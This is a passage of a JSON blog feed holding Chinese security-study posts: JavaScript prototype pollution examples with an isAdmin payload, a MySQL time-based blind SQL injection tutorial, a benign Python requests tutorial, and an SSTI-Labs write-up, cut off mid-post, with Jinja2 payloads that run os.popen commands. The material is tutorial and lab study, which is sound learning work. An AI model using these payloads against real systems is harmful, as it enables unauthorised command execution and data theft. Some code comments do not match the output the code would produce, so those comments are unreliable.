a function</span></span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"comment\">// 修改 normalObj 对象的原型为 maliciousObj</span></span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"title class_\">Object</span>.<span class=\"title function_\">setPrototypeOf</span>(normalObj, maliciousObj);</span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"comment\">// 此时再次访问 getName 方法，输出被污染的内容</span></span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(normalObj.<span class=\"title function_\">getName</span>()); <span class=\"comment\">// 输出：I am a malicious object</span></span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"comment\">//注意:</span></span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"comment\">//若将maliciousObj的getName给注释掉,则会返回I am a base object</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"四存在原型链污染的函数\"><a class=\"markdownIt-Anchor\" href=\"#四存在原型链污染的函数\">#</a> 四。存在原型链污染的函数</h2>\n<h3 id=\"1merge函数\"><a class=\"markdownIt-Anchor\" href=\"#1merge函数\">#</a> 1.merge 函数</h3>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">  <span class=\"keyword\">function</span> <span class=\"title function_\">merge</span>(<span class=\"params\">target, source</span>) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> key <span class=\"keyword\">in</span> source) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (key <span class=\"keyword\">in</span> source &amp;&amp; key <span class=\"keyword\">in</span> target) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"title function_\">merge</span>(target[key], source[key])</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            target[key] = source[key]</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> o1 = &#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> o2 = &#123;<span class=\"string\">&quot;a&quot;</span>: <span class=\"number\">1</span>, <span class=\"string\">&quot;__proto__&quot;</span>: &#123;<span class=\"string\">&quot;b&quot;</span>: <span class=\"number\">2</span>&#125;&#125;</span><br><span class=\"line\"><span class=\"comment\">//let o2=JSON.parse(&#x27;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#x27;)</span></span><br><span class=\"line\"><span class=\"title function_\">merge</span>(o1, o2)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(o1.<span class=\"property\">a</span>, o1.<span class=\"property\">b</span>)<span class=\"comment\">//1,2</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//console.log(o1)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(o2)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(o2.<span class=\"property\">__proto__</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//var o3=Object.create(o1)</span></span><br><span class=\"line\"></span><br><span class=\"line\">o3 = &#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(o3.<span class=\"property\">b</span>)<span class=\"comment\">//undefined</span></span><br></pre></td></tr></table></figure>\n<p>此时 c 没有被污染，因为 o2 的 proto 被解析了，通过 console.log (o2) 可以看出只有一个 a 属性，因为 o2 的 proto 执行的内容不是 o2 的原型的 prototype 而是 {“b”:2} 这个对象，没有到达最上层的 Object.prototype<br>\n 此时我们利用 JSON.parse 函数将 o2 变成对象即可，此时 o2 就有__proto__了 (即__proto__被传递给 o1), 而 o1 是 Object 的实例 (就是 <code>o1.__proto__=Object.prototype</code> ), <code>o1.__proto__.b=2=o2.__proto__.b</code> , 相当于给 Object 加了一个属性 b 值为 2, 此时 c 就被污染了.</p>\n<h3 id=\"2clone函数\"><a class=\"markdownIt-Anchor\" href=\"#2clone函数\">#</a> 2.clone 函数</h3>\n<p>在 JavaScript 中，有时需要需要将一个对象的属性和方法复制到另一个对象，可以用 clone 方法</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">cloneObject</span>(<span class=\"params\">source</span>) &#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"title class_\">Object</span>.<span class=\"title function_\">assign</span>(&#123;&#125;, source);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>但是 Object.assign () 函数存在原型链污染的风险，因为它会复制源对象的原型对象中的属性和方法，比如</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">cloneObject</span>(<span class=\"params\">source</span>) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"title class_\">Object</span>.<span class=\"title function_\">assign</span>(&#123;&#125;, source);</span><br><span class=\"line\"></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 定义一个原型对象</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> myPrototype = &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"attr\">sayHello</span>: <span class=\"keyword\">function</span>(<span class=\"params\"></span>) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">&#x27;Hello!&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// 创建一个空对象</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">var</span> myObject = &#123;&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">  myObject=<span class=\"title function_\">cloneObject</span>(myPrototype);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">//console.log(myObject)</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// 调用myObject上的sayHello方法</span></span><br><span class=\"line\"></span><br><span class=\"line\">  myObject.<span class=\"title function_\">sayHello</span>(); <span class=\"comment\">// Hello!</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"3objectassign函数\"><a class=\"markdownIt-Anchor\" href=\"#3objectassign函数\">#</a> 3.Object.assign 函数</h3>\n<p>如果源对象的属性是一个引用类型（如对象、数组等），则会将引用复制到目标对象中，这可能会造成原型链污染的风险。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> globalA=&#123;&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//在globalA的原型(Object)上定义一个属性</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title class_\">Object</span>.<span class=\"property\"><span class=\"keyword\">prototype</span></span>.<span class=\"property\">globala</span>=<span class=\"string\">&#x27;a&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//用Object.assign合并</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title class_\">Object</span>.<span class=\"title function_\">assign</span>(globalA,&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"attr\">test</span>:<span class=\"string\">&#x27;testtest&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">globalA.<span class=\"property\">globala</span>=<span class=\"string\">&#x27;aa&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(globalA.<span class=\"property\">test</span>);<span class=\"comment\">//testtest</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(globalA.<span class=\"property\">globala</span>);<span class=\"comment\">//aa</span></span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> obj=<span class=\"title class_\">Object</span>.<span class=\"title function_\">create</span>(globalA);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(obj.<span class=\"property\">test</span>);</span><br></pre></td></tr></table></figure>\n<h3 id=\"4objectcreate函数\"><a class=\"markdownIt-Anchor\" href=\"#4objectcreate函数\">#</a> 4.Object.create 函数</h3>\n<p><code>Object.create</code>  是一个用于创建新对象的函数，它可以使用现有对象作为新对象的原型。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 定义一个原型对象</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> myPrototype = &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"attr\">sayHello</span>: <span class=\"keyword\">function</span>(<span class=\"params\"></span>) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">&#x27;Hello!&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// 使用Object.create函数创建一个新对象，并将myPrototype作为它的原型</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">var</span> myObject = <span class=\"title class_\">Object</span>.<span class=\"title function_\">create</span>(myPrototype);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// 调用myObject上的sayHello方法</span></span><br><span class=\"line\"></span><br><span class=\"line\">  myObject.<span class=\"title function_\">sayHello</span>(); <span class=\"comment\">// Hello!</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"5eval函数\"><a class=\"markdownIt-Anchor\" href=\"#5eval函数\">#</a> 5.eval 函数</h3>\n<p><code>eval</code>  函数是一个全局函数，它将传入的字符串作为 JavaScript 代码进行解析和执行。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> myObject = &#123;&#125;;</span><br><span class=\"line\"><span class=\"keyword\">var</span> code = <span class=\"string\">&quot;Object.prototype.isAdmin = &#x27;true&#x27;;&quot;</span>; <span class=\"comment\">// 向原型对象添加属性</span></span><br><span class=\"line\"><span class=\"built_in\">eval</span>(code); <span class=\"comment\">// 执行代码</span></span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(myObject.<span class=\"property\">isAdmin</span>); <span class=\"comment\">// Hello World</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"五应用\"><a class=\"markdownIt-Anchor\" href=\"#五应用\">#</a> 五。应用</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">JSON.parse(&#x27;&#123;&quot;__proto__&quot;: &#123;&quot;isAdmin&quot;: true&#125;&#125;&#x27;)</span><br></pre></td></tr></table></figure>\n",
            "tags": []
        },
        {
            "id": "https://hq185187.github.io/2023/05/07/sql%E6%B3%A8%E5%85%A5%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/",
            "url": "https://hq185187.github.io/2023/05/07/sql%E6%B3%A8%E5%85%A5%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/",
            "title": "时间盲注",
            "date_published": "2023-05-07T07:33:27.765Z",
            "content_html": "<p>例子的表:</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">id</th>\n<th style=\"text-align:center\">name</th>\n<th style=\"text-align:center\">url</th>\n<th style=\"text-align:center\">alexa</th>\n<th style=\"text-align:center\">country</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">1</td>\n<td style=\"text-align:center\">Google</td>\n<td style=\"text-align:center\"><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZ29vZ2xlLmNtLw==\">https://www.google.cm/</span></td>\n<td style=\"text-align:center\">1</td>\n<td style=\"text-align:center\">USA</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">2</td>\n<td style=\"text-align:center\">淘宝</td>\n<td style=\"text-align:center\"><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudGFvYmFvLmNvbS8=\">https://www.taobao.com/</span></td>\n<td style=\"text-align:center\">13</td>\n<td style=\"text-align:center\">CN</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">3</td>\n<td style=\"text-align:center\">菜鸟教程</td>\n<td style=\"text-align:center\"><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5ydW5vb2IuY29tLw==\">http://www.runoob.com/</span></td>\n<td style=\"text-align:center\">10</td>\n<td style=\"text-align:center\">CN</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">4</td>\n<td style=\"text-align:center\">微博</td>\n<td style=\"text-align:center\"><span class=\"exturl\" data-url=\"aHR0cDovL3dlaWJvLmNvbS8=\">http://weibo.com/</span></td>\n<td style=\"text-align:center\">20</td>\n<td style=\"text-align:center\">CN</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">5</td>\n<td style=\"text-align:center\">Facebook</td>\n<td style=\"text-align:center\"><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tLw==\">https://www.facebook.com/</span></td>\n<td style=\"text-align:center\">3</td>\n<td style=\"text-align:center\">USA</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">7</td>\n<td style=\"text-align:center\">stackoverflow</td>\n<td style=\"text-align:center\"><span class=\"exturl\" data-url=\"aHR0cDovL3N0YWNrb3ZlcmZsb3cuY29tLw==\">http://stackoverflow.com/</span></td>\n<td style=\"text-align:center\">0</td>\n<td style=\"text-align:center\">IND</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"基本延时的盲注sleep\"><a class=\"markdownIt-Anchor\" href=\"#基本延时的盲注sleep\">#</a> 基本延时的盲注:sleep</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select * from 表名 where id=1 and sleep(2);</span><br></pre></td></tr></table></figure>\n<p>配合 if 语句</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if(expr1,expr2,expr3)</span><br><span class=\"line\">expr1是真,返回expr2,否则expr3</span><br><span class=\"line\">select * from websites where name=&#x27;1&#x27; or if(name=&#x27;Facebook&#x27;,sleep(2),null);</span><br><span class=\"line\">判断是否有网站名字为Facebook</span><br></pre></td></tr></table></figure>\n<p>配合截取函数<br>\n substr (string,start,length)<br>\nmid(string,start,length)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select * from websites where name=&#x27;2&#x27; or if(substr((select name from websites where id=1),0,1)=&#x27;G&#x27;,sleep(2),0);</span><br></pre></td></tr></table></figure>\n<h3 id=\"1benchmark\"><a class=\"markdownIt-Anchor\" href=\"#1benchmark\">#</a> 1.benchmark()</h3>\n<p>benchmark 是 MySQL 的一个内置函数，作用是测试一些函数的执行速度.benchmark 中有两个参数，第一个是执行的次数，第二个是要执行的函数或者表达式</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; select benchmark(10000,md5(&#x27;a&#x27;));</span><br><span class=\"line\">+---------------------------+</span><br><span class=\"line\">| benchmark(10000,md5(&#x27;a&#x27;)) |</span><br><span class=\"line\">+---------------------------+</span><br><span class=\"line\">|                         0 |</span><br><span class=\"line\">+---------------------------+</span><br><span class=\"line\">1 row in set (0.01 sec)</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; select benchmark(100000000,md5(&#x27;a&#x27;));</span><br><span class=\"line\">+-------------------------------+</span><br><span class=\"line\">| benchmark(100000000,md5(&#x27;a&#x27;)) |</span><br><span class=\"line\">+-------------------------------+</span><br><span class=\"line\">|                             0 |</span><br><span class=\"line\">+-------------------------------+</span><br><span class=\"line\">1 row in set (14.29 sec)</span><br></pre></td></tr></table></figure>\n<p>可以看到执行次数不同，时间也不同，我们接下来用它来达到 sleep 的延时目的</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select 1 and if((substr(user(),1,1)=&#x27;r&#x27;),BENCHMARK(10000000,md5(&#x27;a&#x27;)),1);</span><br></pre></td></tr></table></figure>\n<h3 id=\"2heavy-query\"><a class=\"markdownIt-Anchor\" href=\"#2heavy-query\">#</a> 2.heavy query</h3>\n<p>通过大量的查询导致查询时间变长来达到延时目的</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select count(*) from information_schema.tables A,information_schema.tables B;</span><br><span class=\"line\"></span><br><span class=\"line\">select 1 and if((substr(user(),1,1)=&#x27;r&#x27;),(select count(*) from information_schema.tables A,information_schema.tables B;),1);</span><br></pre></td></tr></table></figure>",
            "tags": []
        },
        {
            "id": "https://hq185187.github.io/2023/05/03/request%E5%BA%93/",
            "url": "https://hq185187.github.io/2023/05/03/request%E5%BA%93/",
            "title": "requests学习",
            "date_published": "2023-05-03T06:54:19.750Z",
            "content_html": "<h3 id=\"基本用法\"><a class=\"markdownIt-Anchor\" href=\"#基本用法\">#</a> 基本用法</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#导入requests库</span><br><span class=\"line\">import requests</span><br><span class=\"line\">#发送一个get请求并得到响应</span><br><span class=\"line\">r = requests.get(&#x27;https://www.baidu.com&#x27;)</span><br><span class=\"line\">#查看响应对象的类型</span><br><span class=\"line\">print(type(r))</span><br><span class=\"line\">#查看响应状态码</span><br><span class=\"line\">print(r.status_code)</span><br><span class=\"line\">#查看响应内容的类型</span><br><span class=\"line\">print(type(r.text))</span><br><span class=\"line\">#查看响应的内容</span><br><span class=\"line\">print(r.text)</span><br><span class=\"line\">#查看cookies</span><br><span class=\"line\">print(r.cookies)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"get\"><a class=\"markdownIt-Anchor\" href=\"#get\">#</a> get</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import requests</span><br><span class=\"line\">data = &#123;</span><br><span class=\"line\">\t&#x27;name&#x27;:&#x27;germey&#x27;,</span><br><span class=\"line\">  &#x27;age&#x27;:22</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">r = requests.get(&#x27;http://httpbin.org/get&#x27;,params=data)</span><br><span class=\"line\">print(r.text)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"post传参\"><a class=\"markdownIt-Anchor\" href=\"#post传参\">#</a> post 传参</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import requests</span><br><span class=\"line\">data = &#123;</span><br><span class=\"line\">  &quot;name&quot;:&quot;germey&quot;,</span><br><span class=\"line\">  &quot;age&quot;:&quot;22&quot;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">r = requests.post(&#x27;http://httpbin.org/post&#x27;,data=data)</span><br><span class=\"line\">print(r.text)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"headers设置\"><a class=\"markdownIt-Anchor\" href=\"#headers设置\">#</a> headers 设置</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import requests</span><br><span class=\"line\">headers = &#123;</span><br><span class=\"line\">  &#x27;User-Agent&#x27;:&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0&#x27;,</span><br><span class=\"line\">  &#x27;my-test&#x27;:&#x27;Hello&#x27;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">r = requests.get(&#x27;http://httpbin.org/get&#x27;,headers=headers)</span><br><span class=\"line\">print(r.text)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"爬取二进制数据\"><a class=\"markdownIt-Anchor\" href=\"#爬取二进制数据\">#</a> 爬取二进制数据</h3>\n<p>图片，音频，视频这些文件本质都是二进制码组成的，要爬它们，要拿到二进制码 (下面以百度的图标为例子)</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests  </span><br><span class=\"line\">r=requests.get(<span class=\"string\">&quot;https://www.baidu.com/favicon.ico&quot;</span>)  </span><br><span class=\"line\"><span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;favicon.ico&#x27;</span>,<span class=\"string\">&#x27;wb&#x27;</span>) <span class=\"keyword\">as</span> f:  </span><br><span class=\"line\">f.write(r.content)</span><br></pre></td></tr></table></figure>\n<h3 id=\"文件上传\"><a class=\"markdownIt-Anchor\" href=\"#文件上传\">#</a> 文件上传</h3>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">files=&#123;<span class=\"string\">&#x27;file&#x27;</span>:<span class=\"built_in\">open</span>(<span class=\"string\">&#x27;test1.jpg&#x27;</span>,<span class=\"string\">&#x27;rb&#x27;</span>)&#125;</span><br><span class=\"line\"><span class=\"comment\">#以二进制方式打开当前目录的test1.jpg文件</span></span><br><span class=\"line\">r=requests.post(<span class=\"string\">&#x27;http://httpbin.org/post&#x27;</span>,files=files)</span><br><span class=\"line\"><span class=\"comment\">#进行上传</span></span><br></pre></td></tr></table></figure>\n",
            "tags": []
        },
        {
            "id": "https://hq185187.github.io/2023/05/02/ssti-labs/",
            "url": "https://hq185187.github.io/2023/05/02/ssti-labs/",
            "title": "SSTI-Labs",
            "date_published": "2023-05-02T04:25:19.347Z",
            "content_html": "<h2 id=\"ssti-labs\"><a class=\"markdownIt-Anchor\" href=\"#ssti-labs\">#</a> ssti-labs</h2>\n<h3 id=\"1\"><a class=\"markdownIt-Anchor\" href=\"#1\">#</a> 1.</h3>\n<p>payload1:(用常规方法找 shell 类)<br>\n(1) 先用脚本找包含 builtins 的类：128,129,130…<br>\n<mark>python3</mark></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3</span><br><span class=\"line\">&#123;&#123;().__class__.__base__.__subclasses__()[128].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;)&#125;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">python2,有file类</span><br><span class=\"line\">&#123;&#123;[].__class__.__bases__[0].__subclasses__()[40](&#x27;flag&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"2过滤了大括号\"><a class=\"markdownIt-Anchor\" href=\"#2过滤了大括号\">#</a> 2. 过滤了大括号</h3>\n<p>可以用</p>\n<figure 